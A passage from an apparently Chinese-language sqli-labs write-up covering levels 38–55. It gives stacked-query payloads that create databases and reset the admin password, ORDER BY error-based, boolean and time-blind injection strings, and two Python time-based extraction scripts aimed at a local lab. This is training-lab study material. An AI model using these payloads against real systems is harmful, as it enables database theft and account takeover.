       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xxxxx              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">0.007</span>s</span><br><span class="line">MySQL root<span class="variable">@localhost</span>:security<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>  <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>  <span class="operator">|</span> Angelina <span class="operator">|</span> I<span class="operator">-</span>kill<span class="operator">-</span>you <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">3</span>  <span class="operator">|</span> Dummy    <span class="operator">|</span> p<span class="variable">@ssword</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span>  <span class="operator">|</span> secure   <span class="operator">|</span> crappy     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span>  <span class="operator">|</span> stupid   <span class="operator">|</span> stupidity  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>  <span class="operator">|</span> superman <span class="operator">|</span> genious    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">7</span>  <span class="operator">|</span> batman   <span class="operator">|</span> mob<span class="operator">!</span>le     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>  <span class="operator">|</span> admin    <span class="operator">|</span> <span class="number">123</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">9</span>  <span class="operator">|</span> admin1   <span class="operator">|</span> admin1     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> admin2   <span class="operator">|</span> admin2     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> admin3   <span class="operator">|</span> admin3     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> dhakkan  <span class="operator">|</span> dumbo      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span> admin4   <span class="operator">|</span> admin4     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span> admin<span class="string">&#x27;#  | 123        |</span></span><br><span class="line"><span class="string">| 38 | less38   | less38     |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">15 rows in set</span></span><br><span class="line"><span class="string">Time: 0.008s</span></span><br><span class="line"><span class="string">MySQL root@localhost:security&gt; select * from security.users</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">| id | username | password   |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">| 1  | Dumb     | Dumb       |</span></span><br><span class="line"><span class="string">| 2  | Angelina | I-kill-you |</span></span><br><span class="line"><span class="string">| 3  | Dummy    | p@ssword   |</span></span><br><span class="line"><span class="string">| 4  | secure   | crappy     |</span></span><br><span class="line"><span class="string">| 5  | stupid   | stupidity  |</span></span><br><span class="line"><span class="string">| 6  | superman | genious    |</span></span><br><span class="line"><span class="string">| 7  | batman   | mob!le     |</span></span><br><span class="line"><span class="string">| 8  | admin    | 123        |</span></span><br><span class="line"><span class="string">| 9  | admin1   | admin1     |</span></span><br><span class="line"><span class="string">| 10 | admin2   | admin2     |</span></span><br><span class="line"><span class="string">| 11 | admin3   | admin3     |</span></span><br><span class="line"><span class="string">| 12 | dhakkan  | dumbo      |</span></span><br><span class="line"><span class="string">| 14 | admin4   | admin4     |</span></span><br><span class="line"><span class="string">| 15 | admin&#x27;</span>#  <span class="operator">|</span> <span class="number">123</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">38</span> <span class="operator">|</span> less38p  <span class="operator">|</span> less38     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">0.007</span>s</span><br></pre></td></tr></table></figure><p>最终补充一下，这几个堆叠注入都无法直接验证存在堆叠注入</p><h2 id="Less-39-堆叠注入"><a href="#Less-39-堆叠注入" class="headerlink" title="Less-39 堆叠注入"></a>Less-39 堆叠注入</h2><p>验证注入点：?id=1’</p><p>利用闭合方式：?id=1;create database less39%23</p><p>闭合方式不一样，其余同 Less-38</p><p>获取所有数据库名称，验证数据库是否正常创建</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="Less-40-堆叠注入"><a href="#Less-40-堆叠注入" class="headerlink" title="Less-40 堆叠注入"></a>Less-40 堆叠注入</h2><p>验证注入点：1%27)%20and%20sleep(5)%23</p><p>利用闭合方式：?id=1’);create database less40%23</p><p>闭合方式不一样，其余同 Less-38</p><p>获取所有数据库名称，验证数据库是否正常创建</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23</span></span><br></pre></td></tr></table></figure><h2 id="Less-41-堆叠注入"><a href="#Less-41-堆叠注入" class="headerlink" title="Less-41 堆叠注入"></a>Less-41 堆叠注入</h2><p>验证注入点：?id=1%20and%20sleep(5)%23</p><p>利用闭合方式：?id=1;create database less41%23</p><p>没有报错回显，其余同 Less-39</p><p>获取所有数据库名称，验证数据库是否正常创建</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="Less-42-POST-堆叠注入"><a href="#Less-42-POST-堆叠注入" class="headerlink" title="Less-42 POST 堆叠注入"></a>Less-42 POST 堆叠注入</h2><p>验证注入点：login_user=admin&amp;login_password=<code>1&#39;</code>&amp;mysubmit=Login</p><p>利用闭合方式：login_user=admin&amp;login_password=<code>1&#39;;update users set password=&#39;1&#39; where username=&#39;admin&#39;%23</code>&amp;mysubmit=Login</p><p>利用堆叠注入修改任意用户密码，即可正常登陆，然后这里还存在万能密码、联合报错时间注入问题，应有尽有</p><h2 id="Less-43-POST-堆叠注入"><a href="#Less-43-POST-堆叠注入" class="headerlink" title="Less-43 POST 堆叠注入"></a>Less-43 POST 堆叠注入</h2><p>验证注入点：login_user=admin&amp;login_password=<code>1&#39;</code>&amp;mysubmit=Login</p><p>利用闭合方式：login_user=admin&amp;login_password=<code>1&#39;);update users set password=&#39;123&#39; where username=&#39;admin&#39;%23</code>&amp;mysubmit=Login</p><p>闭合方式不一样，其余同 Less-42</p><h2 id="Less-44-POST-堆叠注入"><a href="#Less-44-POST-堆叠注入" class="headerlink" title="Less-44 POST 堆叠注入"></a>Less-44 POST 堆叠注入</h2><p>验证注入点：login_user=admin&amp;login_password=<code>1&#39; and sleep(5)%23</code>&amp;mysubmit=Login</p><p>利用闭合方式：login_user=admin&amp;login_password=<code>1&#39;);update users set password=&#39;123&#39; where username=&#39;admin&#39;%23</code>&amp;mysubmit=Login</p><p>没有报错回显，其余同 Less-42</p><h2 id="Less-45-POST-堆叠注入"><a href="#Less-45-POST-堆叠注入" class="headerlink" title="Less-45 POST 堆叠注入"></a>Less-45 POST 堆叠注入</h2><p>验证注入点：login_user=admin&amp;login_password=<code>1&#39;) and sleep(5)%23</code>&amp;mysubmit=Login</p><p>利用闭合方式：login_user=admin&amp;login_password=<code>1&#39;);update users set password=&#39;1&#39; where username=&#39;admin&#39;%23</code>&amp;mysubmit=Login</p><p>没有报错回显，其余同 Less-43</p><h2 id="Less-46-order-by-注入"><a href="#Less-46-order-by-注入" class="headerlink" title="Less-46 order by 注入"></a>Less-46 order by 注入</h2><p>验证注入点1：?sort=1’</p><p>验证注入点2：?sort=1 asc</p><p>验证注入点3：?sort=1 desc</p><p>如果验证注入点2和3的结果不一样，则表明可以注入</p><p>验证注入点4：?sort=sleep(5)</p><p>注意order by 注入不能使用联合注入，不然会报语法错误，我们先观察一下 SELECT 语句在MySQL官方的说明</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span> <span class="operator">|</span> DISTINCTROW ]</span><br><span class="line">    [HIGH_PRIORITY]</span><br><span class="line">    [STRAIGHT_JOIN]</span><br><span class="line">    [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">    [SQL_CACHE <span class="operator">|</span> SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr] ...</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [LIMIT &#123;[<span class="keyword">offset</span>,] row_count <span class="operator">|</span> row_count <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FOR</span> UPDATE <span class="operator">|</span> LOCK <span class="keyword">IN</span> SHARE MODE]</span><br><span class="line"></span><br><span class="line">into_option: &#123;</span><br><span class="line">    <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> var_name [, var_name] ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>order by 注入可以直接跟表达式，所以注入也比较宽松，如</p><ul><li>直接报错注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>布尔盲注</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand(ascii(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>)</span><br></pre></td></tr></table></figure><p>因为 ascii(x)=x 的返回值为0或1，在这里没法根据返回结果区分，不过直接 rand(0) 和 rand(1) 返回值不一样，然后 order by 的结果是有差异的。</p><p>另外，从卿师傅里学到一种异或方式的order by 注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">^</span>(<span class="keyword">select</span>(<span class="keyword">select</span> version()) regexp <span class="string">&#x27;^5&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>regex</code> 匹配成功返回 1 失败 返回 0，1 和 0 的二进制分别是 00000001 和 00000000，与 id 字段每个id值进行异或，除非所有id值都为奇数或偶数，不然必然会导致排序发生改变，如id依次是 1/2/3/4 与1异或分别变成 0/3/2/5，与 0 异或是其本身（异或运算的特点）</p><ul><li>时间盲注</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>正常延时，顺便试试 benchmark延时</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,benchmark(<span class="number">500000000</span>,md5(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>不行，应该是 benchmark 无论如何恒返回0，执不执行无所谓，这里编译器直接优化了？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>(<span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="type">CHAR</span>(<span class="number">115</span>), BENCHMARK(<span class="number">50000000</span>,md5(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0</span>) <span class="keyword">FROM</span> (<span class="keyword">select</span> database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1)</span><br></pre></td></tr></table></figure><p>这个语句就可以正常延时，可能表名这编译器优化问题，所以就执行 benchmark 没有直接获取返回值了，而是执行了</p><p>此外，也可以通过 <code>and xxxx</code> 拼接语句～</p><p>通过观察官方SELECT语句用法， <code>PROCEDURE</code> 存储过程的语句也可以用，比如说</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>mac上这个语句用不了，win和linux环境没问题～</p><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>获取字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>报错函数因有最长返回值限制，因此要获取字段的最大长度，然后分割获取，（这里创建了一个新表<code>longcol</code>和新的字段<code>desc</code>模拟数据长度大于64的场景）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_type <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;longcol&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>返回：<code>XPATH syntax error: &#39;~int(11)~&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_type <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;longcol&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>返回：<code>XPATH syntax error: &#39;~varchar(255)~&#39;</code></p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> mid(`<span class="keyword">desc</span>`,<span class="number">1</span>,<span class="number">30</span>) <span class="keyword">from</span> security.longcol),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>这里 <code>desc</code> 要加反引号是因为 <code>desc</code> 是 MySQL 内置函数，直接使用会报错～</li><li>不断改变 1,30 范围 ，最后变成 mid(`desc`,241,270) 即可获取该字段所有数据，当然也可以优雅些，当获取不到任何值时，就不获取了</li><li>如果数据中间包含很长一段空格，页面前端看着会像只返回1个空格</li></ul><h2 id="Less-47-order-by-注入-字符型"><a href="#Less-47-order-by-注入-字符型" class="headerlink" title="Less-47 order by 注入 字符型"></a>Less-47 order by 注入 字符型</h2><p>验证注入点：?sort=1’</p><p>利用闭合方式：?sort=1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p><p>这里注意点就是不能通过直接 <code>&#39;</code> 闭合，可以 <code> and &#39;</code> 闭合，也可以通过注释闭合</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select mid(`desc`,1,30) from security.longcol),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-48-order-by-盲注入"><a href="#Less-48-order-by-盲注入" class="headerlink" title="Less-48 order by 盲注入"></a>Less-48 order by 盲注入</h2><p>验证注入点：?sort=sleep(5)</p><p>利用闭合方式：if(ascii(substr(database(),1,1))=115,sleep(5),0)</p><p>这关关闭了报错注入，可以布尔盲注或者时间注入获取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-48/?sort=if(ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,sleep(1),0)&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, char_ascii)</span><br><span class="line">            time_start = time.time()</span><br><span class="line">            _ = requests.get(url)</span><br><span class="line">            time_diff = time.time() - time_start</span><br><span class="line">            <span class="comment"># 返回时间 &gt; 5s</span></span><br><span class="line">            <span class="keyword">if</span> time_diff &gt; <span class="number">5</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p>不知为啥延时时间是远大于1S的</p><h2 id="Less-49-order-by-盲注入-字符型"><a href="#Less-49-order-by-盲注入-字符型" class="headerlink" title="Less-49 order by 盲注入 字符型"></a>Less-49 order by 盲注入 字符型</h2><p>验证注入点：?sort=1’</p><p>利用闭合方式：?sort=1’ and if(ascii(substr(database(),1,1))=115,sleep(5),0)–+</p><p>闭合方式不一样，获取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url_template = <span class="string">&quot;http://tari.local:8888/sqli-labs/Less-49/?sort=1&#x27; and if(ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,sleep(1),0)--+&quot;</span></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            url = url_template.<span class="built_in">format</span>(i, char_ascii)</span><br><span class="line">            time_start = time.time()</span><br><span class="line">            <span class="comment"># print(url)</span></span><br><span class="line">            _ = requests.get(url)</span><br><span class="line">            time_diff = time.time() - time_start</span><br><span class="line">            <span class="comment"># 返回时间 &gt; 5s</span></span><br><span class="line">            <span class="keyword">if</span> time_diff &gt; <span class="number">5</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p>这里注意 <code>sort</code> 后面要跟个值，不能直接接单引号</p><h2 id="Less-50-order-by-堆叠注入"><a href="#Less-50-order-by-堆叠注入" class="headerlink" title="Less-50 order by 堆叠注入"></a>Less-50 order by 堆叠注入</h2><p>验证注入点：?sort=1’</p><p>利用闭合方式：?sort=1;create database less50;</p><p>和普通堆叠注入没什么区别</p><h2 id="Less-51-order-by-堆叠注入"><a href="#Less-51-order-by-堆叠注入" class="headerlink" title="Less-51 order by 堆叠注入"></a>Less-51 order by 堆叠注入</h2><p>验证注入点：?sort=1’</p><p>利用闭合方式：?sort=1’;create database less51;</p><p>闭合方式和Less50不一样，其余一样</p><h2 id="Less-52-order-by-堆叠注入"><a href="#Less-52-order-by-堆叠注入" class="headerlink" title="Less-52 order by 堆叠注入"></a>Less-52 order by 堆叠注入</h2><p>验证注入点：?sort=sleep(5)</p><p>利用闭合方式：?sort=1;create database less52;</p><p>只是无报错回显了</p><h2 id="Less-53-order-by-堆叠注入"><a href="#Less-53-order-by-堆叠注入" class="headerlink" title="Less-53 order by 堆叠注入"></a>Less-53 order by 堆叠注入</h2><p>验证注入点：1%27%20and%20sleep(5)–+</p><p>利用闭合方式：?sort=1’;create database less53;</p><p>闭合方式和Less52不一样</p><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>根据题意，限定10个语句从数据库 <code>challenges</code> 获取一个随机表中随机字段的值</p><p>因只是表和字段是随机的，那么前面的判断闭合方式、字段个数判断，回显占位是不用算到这10次里的</p><p>闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure><p>占位符为第2/3个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>获取随机表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>获取随机表名的列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ZZVWJ42YS5<span class="string">&#x27;),3--+</span></span><br></pre></td></tr></table></figure><p>获取数据，其实只要三步接行了～</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>和 Less54一样，只是闭合方式不一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>快进到表名获取</p><figure class="highlight 